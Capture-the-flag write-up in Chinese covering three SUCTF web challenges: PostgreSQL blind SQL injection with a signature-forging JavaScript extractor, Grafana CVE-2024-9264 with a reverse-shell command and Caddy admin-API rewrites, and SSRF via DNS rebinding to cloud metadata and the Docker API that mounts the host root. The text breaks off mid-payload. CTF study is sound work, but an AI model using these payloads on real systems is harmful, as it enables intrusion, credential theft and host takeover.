## SU_Sqli
根据报错可知是PostgreSQL数据库
```
ERROR: unterminated quoted string at or near "' LIMIT 20" (SQLSTATE 42601)
```
不可以用爆破工具和python的request模块
那就手动爆一下
```
' || (SELECT (CASE WHEN (LENGTH(current_database())=3) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
可以确定数据库长度为`3`
再确定数据库为`ctf`
```
' || (SELECT (CASE WHEN (SUBSTR(current_database(),1,1)='c') THEN 'Patch' ELSE 'EMPTY' END)) || '
```
接下来爆表名
```
' || (SELECT (CASE WHEN (LENGTH((SELECT relname FROM pg_class WHERE (CASE WHEN (ASCII(relkind)=114) THEN (CASE WHEN (relnamespace=2200) THEN 1 ELSE 0 END) ELSE 0 END) = 1  LIMIT 1 OFFSET 0))  =5) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
得知表名长度为5
接下来爆表名
```
' || (SELECT (CASE WHEN (ASCII(SUBSTR((SELECT relname FROM pg_class WHERE (CASE WHEN (ASCII(relkind)=114) THEN (CASE WHEN (relnamespace=2200) THEN 1 ELSE 0 END) ELSE 0 END)=1 LIMIT 1 OFFSET 0), 5, 1))  =115) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
得到表名是`posts`但这个是id为0的表名
```
' || (SELECT (CASE WHEN ((SELECT COUNT(*) FROM pg_class WHERE (CASE WHEN (ASCII(relkind)=114) THEN (CASE WHEN (relnamespace=2200) THEN 1 ELSE 0 END) ELSE 0 END)=1) = 2) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
这样可以爆出表名有2个，接下来爆另一个表名
```
' || (SELECT (CASE WHEN (LENGTH((SELECT relname FROM pg_class WHERE (CASE WHEN (ASCII(relkind)=114) THEN (CASE WHEN (relnamespace=2200) THEN 1 ELSE 0 END) ELSE 0 END) = 1  LIMIT 1 OFFSET 1))  =7) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
得知第二个长度为7,爆另一个表名
```
' || (SELECT (CASE WHEN (ASCII(SUBSTR((SELECT relname FROM pg_class WHERE (CASE WHEN (ASCII(relkind)=114) THEN (CASE WHEN (relnamespace=2200) THEN 1 ELSE 0 END) ELSE 0 END)=1 LIMIT 1 OFFSET 1), 1, 1))  =115) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
爆出另一个表名为`secrets`

接下来爆列名
```
' || (SELECT (CASE WHEN (LENGTH(ROW_TO_JSON((SELECT t FROM secrets t LIMIT 1)) || '') = 54) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
可以看到json长度为54
接下来报字段
```
' || (SELECT (CASE WHEN (ASCII(SUBSTR(TEXTIN(JSON_OUT(ROW_TO_JSON((SELECT t FROM secrets t LIMIT 1)))), 1, 1)) = 123) THEN 'Patch' ELSE 'EMPTY' END)) || '
```
可以用脚本爆
```js
// ── 第一步：复制页面里的辅助函数 ──────────────────────────

function b64UrlToBytes(s) {
  let t = s.replace(/-/g, "+").replace(/_/g, "/");
  while (t.length % 4) t += "=";
  const bin = atob(t);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

function bytesToB64Url(bytes) {
  let bin = "";
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function rotl32(x, r) { return ((x << r) | (x >>> (32 - r))) >>> 0; }
function rotr32(x, r) { return ((x >>> r) | (x << (32 - r))) >>> 0; }

const rotScr = [1, 5, 9, 13, 17, 3, 11, 19];

function maskBytes(nonceB64, ts) {
  const nb = b64UrlToBytes(nonceB64);
  let s = 0 >>> 0;
  for (let i = 0; i < nb.length; i++) s = (Math.imul(s, 131) + nb[i]) >>> 0;
  const hi = Math.floor(ts / 0x100000000);
  s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
  const out = new Uint8Array(32);
  for (let i = 0; i < 32; i++) {
    s ^= (s << 13) >>> 0; s ^= s >>> 17; s ^= (s << 5) >>> 0;
    out[i] = s & 0xff;
  }
  return out;
}

function unscramble(pre, nonceB64, ts) {
  const buf = b64UrlToBytes(pre);
  if (buf.length !== 32) throw new Error("prep");
  for (let i = 0; i < 8; i++) {
    const o = i * 4;
    let w = (buf[o] | (buf[o+1]<<8) | (buf[o+2]<<16) | (buf[o+3]<<24)) >>> 0;
    w = rotr32(w, rotScr[i]);
    buf[o]=w&0xff; buf[o+1]=(w>>>8)&0xff; buf[o+2]=(w>>>16)&0xff; buf[o+3]=(w>>>24)&0xff;
  }
  const mask = maskBytes(nonceB64, ts);
  for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
  return buf;
}

function probeMask(probe, ts) {
  let s = 0 >>> 0;
  for (let i = 0; i < probe.length; i++) s = (Math.imul(s, 33) + probe.charCodeAt(i)) >>> 0;
  const hi = Math.floor(ts / 0x100000000);
  s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
  const out = new Uint8Array(32);
  for (let i = 0; i < 32; i++) { s = (Math.imul(s, 1103515245) + 12345) >>> 0; out[i] = (s >>> 16) & 0xff; }
  return out;
}

function mixSecret(buf, probe, ts) {
  const mask = probeMask(probe, ts);
  if (mask[0] & 1) { for (let i=0;i<32;i+=2){const t=buf[i];buf[i]=buf[i+1];buf[i+1]=t;} }
  if (mask[1] & 2) {
    for (let i=0;i<8;i++){
      const o=i*4;
      let w=(buf[o]|(buf[o+1]<<8)|(buf[o+2]<<16)|(buf[o+3]<<24))>>>0;
      w=rotl32(w,3);
      buf[o]=w&0xff;buf[o+1]=(w>>>8)&0xff;buf[o+2]=(w>>>16)&0xff;buf[o+3]=(w>>>24)&0xff;
    }
  }
  for (let i=0;i<32;i++) buf[i]^=mask[i];
  return buf;
}

// ── 第二步：封装带签名的查询函数 ─────────────────────────

// probe 固定（同一浏览器环境不变）
const ua = navigator.userAgent || "";
const brands = navigator.userAgentData?.brands?.map(b=>b.brand+":"+b.version).join(",") || "";
const tz = (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone||""; } catch { return ""; }})();
const intl = (() => { try { return Intl.DateTimeFormat().resolvedOptions().locale?"1":"0"; } catch { return "0"; }})();
const wd = navigator.webdriver ? "1" : "0";
const PROBE = `wd=${wd};tz=${tz};b=${brands};intl=${intl}`;

async function signedQuery(payload) {
  // 每次获取新的 nonce/ts（服务端要求）
  const mat = await fetch('/api/sign').then(r=>r.json()).then(d=>d.data);

  const pre = globalThis.__suPrep(
    "POST", "/api/query", payload,
    mat.nonce, String(mat.ts), mat.seed, mat.salt, ua, PROBE
  );
  if (!pre) throw new Error("__suPrep failed");

  const secret2 = unscramble(pre, mat.nonce, mat.ts);
  const mixed   = mixSecret(secret2, PROBE, mat.ts);
  const sig     = globalThis.__suFinish(
    "POST", "/api/query", payload,
    mat.nonce, String(mat.ts), bytesToB64Url(mixed), PROBE
  );

  const res = await fetch('/api/query', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ q: payload, nonce: mat.nonce, ts: mat.ts, sign: sig })
  });
  return await res.json();
}

// ── 第三步：布尔盲注 + 二分法 ────────────────────────────

// 判断一个条件是否为真（根据实际响应关键字调整）
async function boolCheck(condition) {
  const payload = `' || (SELECT (CASE WHEN (${condition}) THEN 'Patch' ELSE 'EMPTY' END)) || '`;
  const data = await signedQuery(payload);
  // 根据响应内容判断 true/false，按实际情况改
  const raw = JSON.stringify(data);
  return raw.includes("Patch");
}

// 二分查找某个位置的字符 ASCII 值（减少约 90% 请求量）
async function getCharAt(expr, pos) {
  let lo = 32, hi = 126;
  while (lo < hi) {
    const mid = Math.floor((lo + hi) / 2);
    const cond = `ASCII(SUBSTR(${expr}, ${pos}, 1)) > ${mid}`;
    if (await boolCheck(cond)) lo = mid + 1;
    else hi = mid;
  }
  // 验证是否有效字符
  const cond = `ASCII(SUBSTR(${expr}, ${pos}, 1)) = ${lo}`;
  return await boolCheck(cond) ? lo : 0;
}

// 爆破完整字符串
async function extractString(expr, maxLen = 200) {
  let result = "";
  console.log(`[*] 开始提取: ${expr}`);
  for (let pos = 1; pos <= maxLen; pos++) {
    const code = await getCharAt(expr, pos);
    if (code === 0) { console.log(`[+] 完成! 共 ${pos-1} 个字符`); break; }
    result += String.fromCharCode(code);
    console.log(`[+] pos ${pos}: ${result}`);
  }
  return result;
}

// ── 第四步：开始爆破 ──────────────────────────────────────

// 你的目标表达式（JSON序列化后的第一行数据）
const TARGET = `TEXTIN(JSON_OUT(ROW_TO_JSON((SELECT t FROM secrets t LIMIT 1))))`;

extractString(TARGET).then(r => console.log("\n[✓] 最终结果:", r));
```
放到控制台执行就可以爆出`flag`
## SU_Thief
首先dirsearch扫一下目录，发现`/metrics`和`/swagger`
这道题登录页面是弱口令 admin/1q2w3e
访问`/api/admin/settings`可以看到一些设置，其中有`{"enable":"sql_expressions"}`可以执行完整的 SQL 语句
登录后在控制台执行
```jsx
fetch('/api/ds/query', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    queries: [{
      refId: 'A',
      datasource: {type: '__expr__', uid: '__expr__'},
      type: 'sql',
      expression: "SELECT * FROM read_text('/etc/passwd')"
    }],
    from: '1700000000000',
    to: '1800000000000'
  })
}).then(r => r.text()).then(console.log)
```
可以读取`/etc/passwd`
但是读取不了/root/flag 应该是权限不够
用 `glob()` 发现 Grafana 内部结构：
```
expression: "SELECT * FROM glob('/var/lib/grafana/**')"
```
请求结构拆解
```js
{
  queries: [{
    refId: 'A',

    // 指定使用内置表达式引擎，不是任何外部数据源
    datasource: {
      type: '__expr__',
      uid:  '__expr__'
    },

    // 告诉引擎：用 SQL 模式（而不是数学表达式模式）
    type: 'sql',

    // 实际执行的 DuckDB SQL
    expression: "SELECT * FROM read_text('/etc/passwd')"
  }],

  // 时间范围，SQL 模式下只是占位，不影响执行
  from: '1700000000000',
  to:   '1800000000000'
}
```
- `read_text(path)`可以读取文件。
- `glob(pattern)`列出匹配 pattern 的文件路径
 `/api/ds/query` 是什么
这是 Grafana 的**统一查询端点**（Unified Query API），Grafana 前端所有面板的数据查询都走这一个接口，无论后端是 Prometheus、MySQL、Loki 还是 `__expr__`，全部统一收口到这里。
接下来就用
```
expression: "SELECT * FROM glob('/var/lib/grafana/**')"
```
来列取文件，发现 `/var/lib/grafana/grafana.db、marcusolsson-json-datasource` 插件等
接下来枚举数据源
```
fetch('/api/datasources').then(r=>r.json()).then(d=>console.log(JSON.stringify(d, null, 2)))
```
列出来一长串
```
....
  },
  {
    "id": 11,
    "uid": "affz159hiw6psf",
    "orgId": 1,
    "name": "thief2",
    "type": "prometheus",
    "typeName": "Prometheus",
    "typeLogoUrl": "public/app/plugins/datasource/prometheus/img/prometheus_logo.svg",
    "access": "proxy",
    "url": "http://localhost:2019",
    "user": "",
    "database": "",
    "basicAuth": false,
    "isDefault": false,
    "jsonData": {},
    "readOnly": false
  },
  ....
```
发现关键数据都指向了`http://localhost:2019`
id 2 -> caddy-ssrf -> prometheus -> localhost:2019
id 8 -> caddy-api -> alertmanager -> localhost:2019
id 17 -> CE -> loki -> 127.0.0.1:2019
id 16 -> thief3 -> prometheus -> localhost:80
id 12 -> alertmanager -> alertmanager-> 127.0.0.1:2019/root/flag
Grafana 的数据源代理会将路径后缀拼接到数据源 URL 上。**Loki(id=17)** 后端进程可用：
```
// GET http://127.0.0.1:2019/config/ → 读 Caddy 完整配置
fetch('/api/datasources/proxy/17/config/').then(r=>r.text()).then(console.log)
```
返回
```
{"apps":{"http":{"servers":{"srv0":{"listen":[":80"],"routes":[{"handle":[{"handler":"reverse_proxy","upstreams":[{"dial":"127.0.0.1:3000"}]}]}]}}}}}
```
Caddy 只有一条反代规则：80端口 → Grafana(3000)
Caddy Admin API 的 `/load` 端点可以**热重载整个配置**，通过 Loki 代理 POST 过去
```js
fetch('/api/datasources/proxy/17/load', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    apps: {
      http: {
        servers: {
          srv0: {
            listen: [":80"],
            routes: [
              // 新增：/flag 路径由 file_server 提供 /root 目录下的文件
              {
                match: [{path: ["/flag"]}],
                handle: [{handler: "file_server", root: "/root"}]
              },
              // 保留原有反代，避免 Grafana 断开
              {
                handle: [{
                  handler: "reverse_proxy",
                  upstreams: [{dial: "127.0.0.1:3000"}]
                }]
              }
            ]
          }
        }
      }
    }
  })
}).then(r=>r.text()).then(console.log)
// 返回空字符串 = 成功
```
`thief3(id=16)` 指向 `http://localhost:80`，即 Caddy 的 HTTP 入口，代理路径拼接后访问刚才注册的路由：
```
fetch('/api/datasources/proxy/16/flag').then(r=>r.text()).then(console.log)
```
得到flag  SUCTF{c4ddy_4dm1n_4p1_2019_pr1v35c}

### 再重新整理
### 第一步：信息收集
```bash
# dirsearch 扫描
dirsearch -u http://目标IP:端口
# 重点关注 /metrics /swagger /api /admin 等路径
```
弱口令 admin/1q2w3e登录
### 第二步：枚举 Grafana 信息

````javascript
// 1. 查版本和健康状态
fetch('/api/health').then(r=>r.json()).then(console.log)

// 2. 查所有数据源（最关键）
fetch('/api/datasources').then(r=>r.json()).then(d=>console.log(JSON.stringify(d, null, 2)))

// 3. 查系统配置（看开了哪些特性）
fetch('/api/admin/settings').then(r=>r.json()).then(console.log)
```
````
列举数据源
```
fetch('/api/datasources').then(r=>r.json()).then(d=>console.log(JSON.stringify(d, null, 2)))
```
是这些
```
[ { "id": 3, "uid": "bffyqwkjwhr7kf", "orgId": 1, "name": "caddy-admin", "type": "prometheus", "typeName": "Prometheus", "typeLogoUrl": "public/app/plugins/datasource/prometheus/img/prometheus_logo.svg", "access": "proxy", "url": "[http://localhost:2019](http://localhost:2019/)", "user": "", "database": "", "basicAuth": false, "isDefault": true, "jsonData": {}, "readOnly": false }, { "id": 4, "uid": "fffyvk0ji9ekgf", "orgId": 1, "name": "caddy-api", "type": "alertmanager", "typeName": "Alertmanager", "typeLogoUrl": "public/app/plugins/datasource/alertmanager/img/logo.svg", "access": "proxy", "url": "[http://localhost:2019](http://localhost:2019/)", "user": "", "database": "", "basicAuth": false, "isDefault": false, "jsonData": { "implementation": "prometheus" }, "readOnly": false }, { "id": 5, "uid": "cffyvx2o0ag3ke", "orgId": 1, "name": "prometheus", "type": "prometheus", "typeName": "Prometheus", "typeLogoUrl": "public/app/plugins/datasource/prometheus/img/prometheus_logo.svg", "access": "proxy", "url": "", "user": "", "database": "", "basicAuth": false, "isDefault": false, "jsonData": {}, "readOnly": false } ]
```
###  最后
```js
// 第一步：用 alertmanager(id=4) POST /load 修改 Caddy 配置
fetch('/api/datasources/proxy/4/load', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    apps: {
      http: {
        servers: {
          srv0: {
            listen: [":80"],
            routes: [
              {
                match: [{path: ["/flag"]}],
                handle: [{handler: "file_server", root: "/root"}]
              },
              {
                handle: [{handler: "reverse_proxy", upstreams: [{dial: "127.0.0.1:3000"}]}]
              }
            ]
          }
        }
      }
    }
  })
}).then(r=>r.text()).then(console.log)
```

```js
// 第二步：把 caddy-api 的 URL 改到 80 端口
fetch('/api/datasources/4', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    id: 4, uid: 'fffyvk0ji9ekgf', orgId: 1,
    name: 'caddy-api',
    type: 'alertmanager', access: 'proxy',
    url: 'http://localhost:80',
    jsonData: {implementation: 'prometheus'}
  })
}).then(r=>r.json()).then(console.log)
```

```js
// 第三步：取 flag
fetch('/api/datasources/proxy/4/flag').then(r=>r.text()).then(console.log)
```
上面这一堆根本没懂，
重新整理一下，访问靶机得知这是Grafana，版本号为v11.0.0 (83b9528bce)，网上搜一下可以知道这有一个`CVE-2024-9264`的漏洞（还是要多上网搜集呀），github上有Poc。https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
上面有详细的使用方法。
```
python poc.py --url http://localhost:6789/ --username admin --password 1q2w3e --reverse-ip 121.89.81.39 --reverse-port 2333
```
这样可以直接反弹shell。但是没办法直接`cat /root/flag`
应该是权限不够。
试一下suid提权
```
$ find / -user root -perm -4000 -print 2>/dev/null 
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
```
发现没什么可以利用的。
再查看一下系统中所有进程的详细信息。
```
$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2892  1440 ?        Ss   04:05   0:00 /bin/sh /start.sh
root         8  0.0  0.3 1268780 40320 ?       Sl   04:05   0:00 caddy run --config /etc/caddy/caddy_config.json
root        24  0.0  0.0   2892   320 ?        S    04:05   0:00 /bin/sh /start.sh
root        25  0.0  0.0   2792  1280 ?        S    04:05   0:00 sleep 300
root        60  0.0  0.0   6216  3520 ?        S    04:05   0:00 su -s /bin/bash grafana -c  /usr/share/grafana/bin/grafana-server   --homepath=/usr/share/grafana   --config=/etc/grafana/grafana.ini   --packaging=docker   cfg:default.log.mode=console 
root        62  0.0  0.0   2824  1440 ?        S    04:05   0:00 tail -f /dev/null
grafana     63  0.3  1.2 1571964 149464 ?      Ssl  04:05   0:00 grafana server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console
grafana    108  2.5  0.1 753288 22736 ?        Sl   04:05   0:04 /usr/local/bin/duckdb
grafana    132  0.0  0.0   2892  1600 ?        S    04:06   0:00 sh -c bash /tmp/rev 
grafana    133  0.0  0.0   4364  2720 ?        S    04:06   0:00 bash /tmp/rev
grafana    135  0.0  0.0   2892  1600 ?        S    04:06   0:00 sh -i
grafana    138  0.0  0.0   7064  2720 ?        R    04:09   0:00 ps aux
```
发现caddy是由root用户启动的。
同时也暴露了caddy的配置文件路径：/etc/caddy/caddy_config.json
```
$ cat /etc/caddy/caddy_config.json
{
    "apps": {
        "http": {
            "servers": {
                "srv0": {
                    "listen": [":80"],
                    "routes": [
                        {
                            "handle": [
                                {
                                    "handler": "reverse_proxy",
                                    "upstreams": [
                                        {
                                            "dial": "127.0.0.1:3000"
                                        }
                                    ]
                                }
                            ]
                        }
                    ]
                }
            }
        }
    }
}
```
利用curl可以直接动态修改caddy的配置
详情参阅caddy-api文档：[https://caddyserver.com/docs/api](https://caddyserver.com/docs/api)
确保2019端口开放
```
$ curl http://127.0.0.1:2019/config/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   150  100   150    0     0   223k      0 --:--:-- --:--:-- --:--:--  146k
{"apps":{"http":{"servers":{"srv0":{"listen":[":80"],"routes":[{"handle":[{"handler":"reverse_proxy","upstreams":[{"dial":"127.0.0.1:3000"}]}]}]}}}}}
```
根据官方文档
### PUT /config/[path][🔗](https://caddyserver.com/docs/api#put-configpath "Link to this section")

Changes Caddy's configuration at the named path to the JSON body of the request. If the destination value is a position (index) in an array, PUT inserts; if an object, it strictly creates a new value.

### Example[🔗](https://caddyserver.com/docs/api#example-1 "Link to this section")

Add a listener address in the first slot:

```
curl -X PUT \
	-H "Content-Type: application/json" \
	-d '":8080"' \
	"http://localhost:2019/config/apps/http/servers/myserver/listen/
```
动态添加路由：将`/root/*`映射到系统根目录`/`

> 注意需要添加`/0` 以确保在第一个槽位中添加监听器地址

```shell
curl -X PUT http://127.0.0.1:2019/config/apps/http/servers/srv0/routes/0 \
-H "Content-Type: application/json" \
-d '{
    "handle": [{
        "handler": "file_server",
        "root": "/"
    }],
    "match": [{
        "path": ["/root/*"]
    }]
}'
```
添加好路由后直接访问：[http://target:port/root/flag](http://target:port/root/flag) 即可拿到flag
这道题有点启发，遇到不会的题目还是要多上网搜，说不定用的就是某个CVE漏洞。

## SU_uri
这道题是一个简单的webhook调试页面，可以给指定的url以json格式发送POST请求，然后把响应内容返回到页面上，基本的127.0.0.1的各种变形形式都试过了，也试了其他的协议，也被禁了，都过滤了。可以试一下302跳转，也不行。
接下来就想到DNS重绑定，
用工具`https://lock.cmpxchg8b.com/rebinder.html`把，`169.254.169.254`和我的公网ip地址，绑定，
得到`http://a9fea9fe.79595127.rbndr.us`以这个为目标地址不断发包，大部分回显`blocked IP: 169.254.169.254`
但也有可能回显
```
{"message":"forwarded","target_status":200,"target_body":"1.0\n2007-01-19\n2007-03-01\n2007-08-29\n2007-10-10\n2007-12-15\n2008-02-01\n2008-09-01\n2009-04-04\nlatest"}
```
这样就意味着重绑定到我的公网ip了。
接着试一下爆主机名
/latest/meta-data/local-hostname
```
{"url":"http://a9fea9fe.79595127.rbndr.us/latest/meta-data/local-hostname","body":"{\"test\":\"123\"}"}
回显
{"message":"forwarded","target_status":200,"target_body":"suctf2026-0009.novalocal"}
```
/latest/meta-data/security-groups
```
{"url":"http://a9fea9fe.79595127.rbndr.us/latest/meta-data/security-groups","body":"{\"test\":\"123\"}"}
回显
{"message":"forwarded","target_status":200,"target_body":"SUCTF2026\nSys-WebServer"}
```

回显 `suctf2026-0009.novalocal` — **`novalocal` 说明这是 OpenStack/Nova 云环境**
接下来测试
/openstack/latest/meta_data.json
```
{"url":"http://a9fea9fe.79595127.rbndr.us/openstack/latest/meta_data.json","body":"{\"test\":\"123\"}"}
回显
{"message":"forwarded","target_status":200,"target_body":"{\"uuid\": \"1c955dd5-8047-41c7-b8d1-106c7ec806f6\", \"meta\": {\"cascaded.instance_extrainfo\": \"pcibridge:1,virtio_bus_count:8\", \"os_bit\": \"64\", \"metering.resourcetype\": \"1\", \"metering.image_id\": \"0bcd8945-dd10-4990-8963-150f26aefdf1\", \"os_type\": \"Linux\", \"metering.cloudServiceType\": \"hws.service.type.ec2\", \"metering.resourcespeccode\": \"x1.8u.8g.linux\", \"image_name\": \"Ubuntu 22.04 server 64bit\", \"metering.imagetype\": \"gold\", \"__support_agent_list\": \"hss,ces\", \"vpc_id\": \"2079b8dd-9b07-4307-905a-ed4828404689\", \"charging_mode\": \"0\"}, \"hostname\": \"suctf2026-0009.novalocal\", \"name\": \"SUCTF2026-0009\", \"launch_index\": 0, \"availability_zone\": \"cn-southwest-2e\", \"enterprise_project_id\": \"3fc4e2c1-db6c-42bb-aff0-723edbdf5143\", \"region_id\": \"cn-southwest-2\", \"services\": {\"domain\": \"\"}, \"instance_type\": \"x1.8u.8g\", \"random_seed\": \"zVJ+sfrfG5YPnk5qX3yDhmQU6NwWRhSOam209x9+DlC+79iihblQqMVK3zBZdrAOAn+taULObmIXWeVyeWGmI60XXgtF5oSL8FONsx/IHfTDZ2PjATDvtzfwYJ3JoM+G8REt6h6PqSwcwfESLt++0DNgCiwfosnxqofGnVmrziNEhduZPXNHhQkNs1jGnJ0fRP3l35nS3LvzTQcjtHO3+cuHdcdf9oxgJPMnL6Yong9F78AqOWSmF0vdjSSP8sdCbwSfSdaOSb3m0jGndLZ3I1zMs78fPpW26cJj2wPiumxTGXgvTiwnAUgr0iJUUD7aMiU840xUyzfDx3hX+1FGMDe/H6Y9duOblVdV0tn15IvKxUXvXTSeRsuKmrWT71g+Ab1nlwyAvk/nyVVMEFbcvwtgMM0FVaMo6wn9Drrwv/ZlrGrIYwkfdadYrArTWx0hxRTaDcJKhhSGap87dihlpAt7llPMMIO5YVgzmiPEuY9znlS8LH09cS0nxCO0+keuef1Atw5UE/O4BvCe95I0pO7kO/tz65bZXFqMSEGFuQNZ1xH+9KY8dVmppi27xjdsuvmd0fGtN345lCJDdFx5zBNcSV7YNy9wIqbhzwNcRkzlr36RXo+XUdfLw7tVTBnMF1DQadBTgtp/NFioH3L7b6QqOJ/d+iqJ/KB5ajaVWBU=\", \"project_id\": \"4fa444895b0c4442a763b17fee7b2dcc\"}"}

```
/openstack/latest/user_data
```
{"url":"http://a9fea9fe.79595127.rbndr.us/openstack/latest/user_data","body":"{\"test\":\"123\"}"}
回显
{"message":"forwarded","target_status":200,"target_body":"#!/bin/bash\necho 'root:$6$lLVinV2m$PwZqSF2j26KRpf2/AcJ0XnpSqi176CkGZ78u0GAnAPb5Qpoz4ArD4Ot0VlShVCnJWyfETiq1sfCI2LHstdZ5W.' | chpasswd -e;"}
```
这样就爆破出root用户了，爆破试一下
```
hashcat -m 1800 hash.txt rockyou.txt
```
感觉爆不出来。
那就扫一下题目端口
```
7f000001.65f56cfa.rbndr.us
```
其中`7f000001`是`127.0.0.1`而，`65f56cfa`就是题目ip的十六进制(这里也可以直接用一个公网ip，不一定要是题目ip，只要是可以正常访问的就可以，可以用自己VPS的ip)。
扫一下常见的服务端口
```
# Web 服务
http://7f000001.65f56cfa.rbndr.us:80/
http://7f000001.65f56cfa.rbndr.us:8080/
http://7f000001.65f56cfa.rbndr.us:8888/
http://7f000001.65f56cfa.rbndr.us:3000/
http://7f000001.65f56cfa.rbndr.us:5000/
http://7f000001.65f56cfa.rbndr.us:8000/
http://7f000001.65f56cfa.rbndr.us:9000/

# 数据库
http://7f000001.65f56cfa.rbndr.us:6379/   ← Redis
http://7f000001.65f56cfa.rbndr.us:27017/  ← MongoDB
http://7f000001.65f56cfa.rbndr.us:3306/   ← MySQL
http://7f000001.65f56cfa.rbndr.us:5432/   ← PostgreSQL

# 其他
http://7f000001.65f56cfa.rbndr.us:22/     ← SSH
http://7f000001.65f56cfa.rbndr.us:4444/
http://7f000001.65f56cfa.rbndr.us:9200/   ← Elasticsearch
```
试一下22端口，是开着的，如果可以爆破出密码就可以拿到shell
```
{"message":"forward request failed: Post \"http://7f000001.65f56cfa.rbndr.us:22\": net/http: HTTP/1.x transport connection broken: malformed HTTP status code \"Ubuntu-3ubuntu0.13\""}
```
扫描到`2375`端口，返回
```
{"message":"forwarded","target_status":404,"target_body":"{\"message\":\"page not found\"}\n"}
```
这个味道很像 Go 写的 API 服务，我第一反应就是 Docker Remote API，因为 Docker 默认就是 2375/2376 这组端口。于是我直接拿 webhook 去打 Docker 的经典 POST 路由 /containers/create，请求体写成创建一个 alpine 容器：
```
targeturl : http://7f000001.65f56cfa.rbndr.us:2375/containers/create
json-data : {"Image":"alpine","Cmd":["sh", "-c", "id"]}
回显
{
  "message": "forwarded",
  "target_status": 201,
  "target_body": "{\"Id\":\"9a107dfcb36b608bc2218997e438d6aee2a873fa3ab9fc1957794b655587d31c\",\"Warnings\":[]}\n"
}
```
结果回显201，说明Docker-api创建成功，回显了id,接下来启动容器
既然能调 Docker API，这题就已经是宿主机 RCE 了。接下来我走标准利用链：先 POST `/containers/create` 创建容器，再 POST `/containers/<id>/start` 启动，再 POST `/containers/<id>/wait` 等待执行结束，最后 POST `/containers/<id>/attach?logs=1&stdout=1&stderr=1&stream=0` 取回标准输出。为了直接读宿主机文件，我在建容器时加了一个只读挂载，把宿主机根目录绑到容器里的 /host：
具体操作
**创建容器**
```
{
  "url": "http://7f000001.65f56cfa.rbndr.us:2375/containers/create",
  "body": "{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /host/flag || find /host -name '*flag*' 2>/dev/null\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}"
}
回显
{"message":"forwarded","target_status":201,"target_body":"{\"Id\":\"23559549cc17fb216593c5448a4df45a78bd96b52bc435af9b227bbda549670b\",\"Warnings\":[]}\n"}
```
把宿主机的 `/` 挂载到容器的 `/host`，这样可以读宿主机任意文件。
记住返回的 **容器 ID**。
**接下来启动**
```
{
  "url": "http://7f000001.65f56cfa.rbndr.us:2375/containers/23559549cc17fb216593c5448a4df45a78bd96b52bc435af9b227bbda549670b/start",
  "body": "{}"
}
回显
{"message":"forwarded","target_status":204}
```
容器启动成功。
**等待执行完成**
```
{
  "url": "http://7f000001.65f56cfa.rbndr.us:2375/containers/23559549cc17fb216593c5448a4df45a78bd96b52bc435af9b227bbda549670b/wait",
  "body": "{}"
}
回显
{"message":"forwarded","target_status":200,"target_body":"{\"StatusCode\":0}\n"}
```
**读取日志**
```
{
  "url": "http://7f000001.65f56cfa.rbndr.us:2375/containers/23559549cc17fb216593c5448a4df45a78bd96b52bc435af9b227bbda549670b/attach?logs=1&stdout=1&stderr=1&stream=0",
  "body": "{}"
}
回显
{"message":"forwarded","target_status":200,"target_body":"\u0001\u0000\u0000\u0000\u0000\u0000\u00002Flag is not here. executable /readflag to get it!\n"}
```
根据提示，应该是要到`/readflag`里读取flag。
也就是读取`cat /host/readflag`
再重新试一遍刚才的操作
```
{
  "url": "http://7f000001.65f56cfa.rbndr.us:2375/containers/create",
  "body": "{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /host/readflag || find /host -name '*flag*' 2>/dev/null\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}"
}
回显
{"message":"forwarded","target_status":201,"target_body":"{\"Id\":\"707e59e1b1a331879e3f0ab6687a3a81b58dc2739a405ffe21d973e5d45285ef\",\"Warnings\":[]}\n"}
```
接下来操作同上
发现这个是一个ELF可执行文件，再执行它。
```
{
  "url": "http://7f000001.65f56cfa.rbndr.us:2375/containers/create",
  "body": "{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"/host/readflag || find /host -name '*flag*' 2>/dev/null\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}"
}
回显
{"message":"forwarded","target_status":201,"target_body":"{\"Id\":\"b579c9ed3ffc8ef40d31bff26153f08c66d42312c4f5a050f2f905d929db980e\",\"Warnings\":[]}\n"}
```
接下来同上。
最后得到flag SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
因为这道题开放了22端口，但是密码也爆破不出来，所以我认为有另一个解法（但是没经过验证，题目环境好像有问题），既然已经有 Docker API 未授权访问，且可以挂载宿主机根目录，可以直接**往宿主机写文件**，用 Docker API 写入 SSH 公钥，
```
{
  "Image": "alpine",
